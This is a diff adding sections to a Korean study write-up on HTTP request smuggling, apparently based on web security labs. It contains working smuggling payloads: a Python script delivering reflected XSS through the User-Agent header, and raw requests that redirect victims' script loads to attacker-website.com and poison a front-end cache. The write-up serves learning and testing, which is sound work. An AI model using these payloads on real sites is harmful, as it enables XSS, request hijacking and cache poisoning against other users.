@@ -15,7 +15,7 @@ or
 
 - python urlparse의 취약점을 이용한 CSRF + Django SSTI
 
-CSRF 는 다른 문제에서도 많이 공부할 수 있어서 간단히 링크만 남겨드리고, HTTP Smuggling attack이 뭔지, 예제를 풀어보면서 공부해보겠습니다.
+CSRF 는 다른 문제에서도 많이 공부할 수 있어서 간단히 취약점 링크만 남겨드리고, HTTP Smuggling attack이 뭔지, 예제를 풀어보면서 공부해보겠습니다.
 
 > 🚀 [https://bugs.python.org/issue35748](https://bugs.python.org/issue35748)
 
@@ -752,7 +752,158 @@ print (data.decode())
 
 ![image](https://user-images.githubusercontent.com/51329156/98478034-145cb680-223a-11eb-8e02-c4e1bf3ac6b5.png)
 
+BOT이 어떤 주기로 요청을 보내는지 몰라서 고생했습니다..
 
+### 😎 Using HTTP request smuggling to exploit reflected XSS
+
+**HTTP request smuggling**에 취약하고 **reflected XSS**가 가능한 어플리케이션이 있으면, 다른 사용자를 공격할 때 **HTTP request smuggling**을 사용할 수 있습니다. 이런 공격방식은 그냥 **reflected XSS**만 사용하는 것보다 효과가 훨씬 강력합니다 :
+
+- 사용자와 상호작용하는 게 필요 없습니다. 사용자에게 URL을 주고 방문할 때까지 기다릴 필요없이, XSS 페이로드를 담고 있는 요청과 다음 사용자의 정상적인 요청을 smuggle 하면 됩니다.
+-  HTTP 요청 헤더같이 **reflected XSS**를 수행할 때 통제할 수 없는 지점까지 사용해서 XSS를 일으킬 수 있습니다.
+
+예를 들어, `User-Agent` 헤더에 **reflected-XSS** 취약점이 있는 어플리케이션을 가정해봅시다. 그러면 request smuggling를 사용해 익스플로잇할 수 있습니다 :
+
+``` http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
+```
+
+다음 사용자의 요청은 smuggle된 요청에 붙어서, XSS 페이로드가 포함된 응답을 받게 됩니다.
+
+**Lab: Exploiting HTTP request smuggling to deliver reflected XSS**
+
+**LAB Description**
+
+Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. 
+
+`User-Agent` 헤더를 통한 **reflected XSS** 에 취약하고, 이 랩을 풀려면 다른 사용자가 `alert(1)`을 실행시키게 하면 됩니다.
+
+**PAYLOAD :**
+
+``` python
+second_request  = b'GET /post?postId=5 HTTP/1.1\r\n'
+second_request += b'Host: '+HOST.encode()+b'\r\n'
+second_request += b'User-Agent:"/> <script>alert(1)</script>\r\n'
+second_request += b'\r\n'
+second_request += b'x=1'
+
+first_request  = b'POST / HTTP/1.1\r\n'
+first_request += b'Host: '+HOST.encode()+b'\r\n'
+first_request += b'Content-Length: '+str(len(second_request)+5).encode()+b'\r\n'
+first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+first_request += b'Transfer-Encoding: chunked\r\n'
+first_request += b'\r\n'
+first_request += b'0\r\n\r\n'
+```
+
+comment form을 보면 hidden 타입의 input 중에 `userAgent` 가 있습니다.
+
+``` html
+<input required="" type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36">
+```
+
+요청의 `User-Agent` 헤더로부터 값을 가져오기 때문에 이 페이지를 방문할 때 `User-Agent` 값을 바꿔주면 **reflected XSS** 를 이용해 `alert(1)`을 실행할 수 있습니다.
+
+### 😎 Using HTTP request smuggling to turn an on-site redirect into an open redirect
+
+많은 어플리케이션들이 요청의 `Host`헤더에 redirect할 호스트를 넣어서 다른 URL로 on-site redirect를 수행합니다.
+
+예 중에 하나가 Apache, IIS 웹 서버의 기본 동작인데, 끝에 슬래쉬를 붙이지 않고 폴더에 접근하려고 하면, 같은 폴더를 대상으로 슬래쉬를 붙여서 리다이렉트 시킵니다.
+
+**Request :**
+
+``` http
+GET /home HTTP/1.1
+Host: normal-website.com
+```
+
+ **Response :**
+
+``` http
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+이런 동작이 평소에는 위험하지 않은 것 같지만,  request smuggling 공격을 사용해서 사용자의 요청을 다른 도메인으로 보내는 방식으로 익스플로잇할 수 있습니다. 예시를 봅시다 :
+
+``` http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+
+smuggled된 요청이 공격자의 웹사이트로 리다이렉트를 발생시킵니다.
+
+**Smuggled request :**
+
+``` http
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+**Response :**
+
+``` http
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+원래 요청은 페이지에 포함된 자바스크립트 파일을 위한 것이었는데, 공격자의 웹사이트에 자바스크립트 파일을 만들어 놓으면 그 파일로 요청이 리다이렉트됩니다.
+
+### 😎 Using HTTP request smuggling to perform web cache poisoning
+
+앞 공격의 변형인데, **HTTP request smuggling**을 이용해서 **web cache poisoning** 공격이 가능함을 보여주고 있습니다. Front-end 기능 중 일부가 같은 요청에 대한 응답을 캐싱하고 있다면, off-site 리다이렉트를 통해 cache를 공격할 수 있습니다.  성공하면 공격당한 URL로 요청을 보내는 모든 사용자를 대상으로 공격할 수 있는 강력한 공격방법입니다.
+
+예로, 공격자는 Front-end 서버에게 다음과 같은 요청을 보냅니다 :
+
+``` http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 59
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+smuggle된 요청은 Back-end 서버로부터 바로 이전 공격과 같은 응답을 밭습니다(off-site redirect). Front-end 서버는 다음과 같이 캐싱합니다 :
+
+**Request :**
+
+``` http
+GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+**Response :**
+
+``` http
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+다른 사용자가 같은 URL로 요청을 보내면, 모두 공격자의 웹사이트로 redirect됩니다.
 
 ### UPDATING.. 
 
